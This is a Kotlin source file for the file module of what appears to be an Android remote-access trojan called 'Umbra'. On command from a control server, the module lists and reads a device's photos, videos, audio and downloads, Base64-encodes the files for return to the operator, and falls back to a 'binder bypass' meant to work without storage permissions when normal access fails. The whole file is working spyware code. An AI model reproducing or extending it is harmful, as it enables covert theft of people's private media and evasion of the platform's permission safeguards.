package org.umbra.core.modules

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import org.umbra.core.c2.Command
import org.umbra.core.core.FileEntry
import org.umbra.core.core.UmbraResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.InputStream

object FileModule {

    suspend fun list(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val type = cmd.params["type"] ?: "images"
        val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50

        val uri = when (type) {
            "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            "audio"  -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            "downloads" -> MediaStore.Downloads.EXTERNAL_CONTENT_URI
            else -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.RELATIVE_PATH
        )

        var cursor: Cursor? = null
        var files = mutableListOf<FileEntry>()

        // ── Route 1: ContentResolver (requires permission, may throw) ──
        try {
            cursor = context.contentResolver.query(
                uri, projection, null, null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )
            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val pathCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)

                var i = 0
                while (it.moveToNext() && i < count) {
                    files.add(FileEntry(
                        id = it.getLong(idCol).toString(),
                        name = it.getString(nameCol),
                        size = it.getLong(sizeCol),
                        date = it.getLong(dateCol),
                        path = it.getString(pathCol) ?: ""
                    ))
                    i++
                }
            }
            if (files.isNotEmpty()) {
                Log.d("Umbra.Files", "ContentResolver success: ${files.size} files")
            }
        } catch (e: Exception) {
            Log.d("Umbra.Files", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
        }

        // ── Route 2: Binder bypass (works without permissions) ──
        if (files.isEmpty()) {
            try {
                val binderFiles = PermissionBypass.readFilesViaBinder(context, type, count)
                if (binderFiles.isNotEmpty()) {
                    files = binderFiles.toMutableList()
                    Log.d("Umbra.Files", "Binder bypass SUCCESS: ${files.size} files")
                } else {
                    Log.d("Umbra.Files", "Binder bypass returned 0 files")
                }
            } catch (e: Exception) {
                Log.e("Umbra.Files", "Binder bypass FAILED: ${e.message}", e)
            }
        }

        UmbraResponse.FileListResponse(entries = files)
    }

    suspend fun read(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val fileId = cmd.params["id"]?.toLongOrNull()
        val fileType = cmd.params["type"] ?: "images"

        if (fileId == null) {
            return@withContext UmbraResponse.ErrorResponse(error = "missing_id", module = "files")
        }

        val uri = when (fileType) {
            "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            "audio"  -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            else -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val contentUri = Uri.withAppendedPath(uri, fileId.toString())
        val name = cmd.params["name"] ?: "unknown"

        // ── Route 1: ContentResolver ──
        try {
            val input: InputStream? = context.contentResolver.openInputStream(contentUri)
            val bytes = input?.use { it.readBytes() } ?: ByteArray(0)
            if (bytes.isNotEmpty()) {
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val mimeType = context.contentResolver.getType(contentUri) ?: "application/octet-stream"
                return@withContext UmbraResponse.FileReadResponse(
                    file_id = fileId.toString(),
                    mime_type = mimeType,
                    size_bytes = bytes.size.toLong(),
                    base64_data = b64
                )
            }
        } catch (e: Exception) {
            Log.d("Umbra.Files", "ContentResolver read failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
        }

        // ── Route 2: Binder bypass ──
        try {
            val bytes = PermissionBypass.readFileViaBinder(context, fileId, fileType)
            if (bytes != null && bytes.isNotEmpty()) {
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                Log.d("Umbra.Files", "Binder bypass read SUCCESS: ${bytes.size} bytes")
                return@withContext UmbraResponse.FileReadResponse(
                    file_id = fileId.toString(),
                    mime_type = "application/octet-stream",
                    size_bytes = bytes.size.toLong(),
                    base64_data = b64
                )
            }
        } catch (e: Exception) {
            Log.e("Umbra.Files", "Binder bypass read FAILED: ${e.message}", e)
        }

        UmbraResponse.ErrorResponse(error = "read:all_routes_failed", module = "files")
    }
}
